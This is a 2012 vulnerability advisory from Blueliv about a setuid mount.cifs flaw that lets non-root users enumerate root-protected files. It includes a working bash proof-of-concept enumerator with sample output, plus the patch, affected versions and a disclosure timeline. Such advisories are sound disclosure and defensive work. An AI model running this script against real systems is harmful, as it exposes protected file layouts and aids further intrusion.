@@ -1,0 +1,146 @@
+########## Blueliv Advisory 2012-004 ##########
+- Discovered by: Jesus Olmos Gonzalez at Blueliv
+- Risk: 5/5
+- Impact: 1/5
+###############################################
+
+1. VULNERABILITY
+-------------------------
+linux privileged and arbitrary chdir(),
+this leads to an arbitary file identification as root.
+
+2. BACKGROUND
+-------------------------
+mount.cifs (GNU Software) is part of linux base system, and is setuided on
+most of the distributions (archlinux, debian, ubuntu, ...)
+
+This software mounts cifs partition to directories authorized by fstab.
+
+3. DESCRIPTION
+-------------------------
+Althow there is not authorized cifs mounts, is possible by the second
+parameter
+to control a privileged chdir() syscall and infer the return value throught
+the responses.
+
+This implies, a little security breach on linux permissions. A non root user
+can enumerate files and directories as root.
+
+This can help to exploit another vulnerabilities, enumerate /root/
+contents,
+descriptors used by any process, user homes, etc ...
+
+one of the attack vectors is /root/ directory scan:
+
+[sha0@spinlock advs]$ ./root_eye.sh wordlist /root/
+--- directories ---
+.pulse1
+.bash_history
+.alsaplayer
+.dbus
+.mozilla
+.VirtualBox
+.vim
+.links
+.config
+.cpan
+.gnome2
+--- files ---
+.pulse-cookie
+.keystore
+.bash_profile
+dead.letter
+.mysql_history
+.Xauthority
+.vimrc
+.viminfo
+secret
+
+Also let to enumerate sub-sub directories in order to dump readable files.
+
+4. PROOF OF CONCEPT
+-------------------------
+#!/bin/bash
+# root enumerator 0day by jesus.olmos (at) blueliv (dot) com [email concealed] @sha0coder
+# discover root protected files & directories, user homes, process
+descriptors, ...
+
+path=$2
+wordlist=$1
+
+for i in `cat $wordlist`
+do
+
+echo -n "$i:"
+
+/sbin/mount.cifs //127.0.0.1/a $path/$i
+
+done 2>log.$$ 1>&2
+
+echo --- directories ---
+for i in `grep 'denied' log.$$ | cut -d ':' -f 1`
+do
+echo $i
+done
+
+echo --- files ---
+for i in `grep -i 'not a directory' log.$$ | cut -d ':' -f 1`
+do
+echo $i
+done
+
+rm log.$$
+
+5. BUSINESS IMPACT
+-------------------------
+May involve issues of confidentiality.
+
+6. SYSTEMS AFFECTED
+-------------------------
+all versions prior to 5.4
+
+7. SOLUTION
+-------------------------
+Easy solution: Don't setuid mount.cifs
+The Patch: https://attachments.samba.org/attachment.cgi?id=7416
+
+Or upgrade to 5.4 release.
+
+8. REFERENCES
+-------------------------
+http://bugzilla.samba.org/show_bug.cgi?id=8821
+http://gnu.org
+
+9. CREDITS
+-------------------------
+Jesus Olmos Gonzalez jolmos(at)blueliv(dot)com @sha0coder
+Blueliv blueliv(dot)com
+Rootedcon Arena2012 rootedcon(dot)es
+
+10. DISCOLSURE TIMELINE
+-------------------------
+February 20, 2012: Vulnerability discovered
+March 07, 2012: Reported to the vendor, through bugzilla.
+March 13, 2012: No vendor respon.
+March 21, 2012: Reported again to vendor.
+March 27, 2012: Vendor response, studying the best way to fix it,
+but they recommend not to setuid by default.
+March 31, 2012: The patch was aplied to 5.4 release
+
+11. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+Blueliv accepts no responsibility for any damage
+caused by the use or misuse of this information.
+
+-- 
+Jesús Olmos
+jesus.olmos (at) blueliv (dot) com [email concealed]
+OPST, CEH, ECSP certified
+
+Parc Innovació La Salle
+C/Sant Joan de la Salle 42, Planta 3
+08022 Barcelona
+Telf. + 34 902908712
+Fax. + 34 933960900
